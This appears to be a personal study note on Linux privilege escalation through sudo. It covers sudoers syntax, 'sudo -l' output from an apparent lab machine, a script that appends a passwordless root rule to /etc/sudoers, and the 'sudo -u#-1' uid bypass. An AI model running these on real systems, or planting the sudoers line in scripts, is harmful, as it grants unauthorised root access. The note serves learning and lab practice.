---
publish: true
created: 2026-01-30T15:21:47.441+05:30
modified: 2026-06-22T09:02:37.460+05:30
tags:
  - LPE
---

This file `/etc/sudoers` dictates, who can do what on the machine.

if you have already sudo rights, you can edit it with `sudo visudo`.
if you can edit the file, you can give yourself all perms. `username ALL=(ALL:ALL) ALL`.
username - to whom the rule applies
first ALL - all hosts
(ALL:ALL) - any target user : any target group

## list the privileges

```
www-data@jarvis:/var/www/Admin-Utilities$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

The above output means, i can run `simpler.py` file as user **pepper** as shown below.

```
sudo -u pepper /var/www/Admin-Utilities/simpler.py
```

# Privilege Escalation

If you have access to run `bash`, can modify shell `.sh` script. Then add the below script to shell script and run. it will modify sudoers file.

```
#!/bin/bash

echo "nibbler ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
```

once added, you can run `sudo su`.

# sudo as specific user #1000

```
sudo -u#1000 <command>

sudo -u anotheruser command

sudo anotheruser
Password:

su root
Password:

```

## Exploit

Using -1 or unsigned equivalent (4294967295) in uid.

`sudo -u#-1 <command>`
`sudo -u#4294967295 <command>`
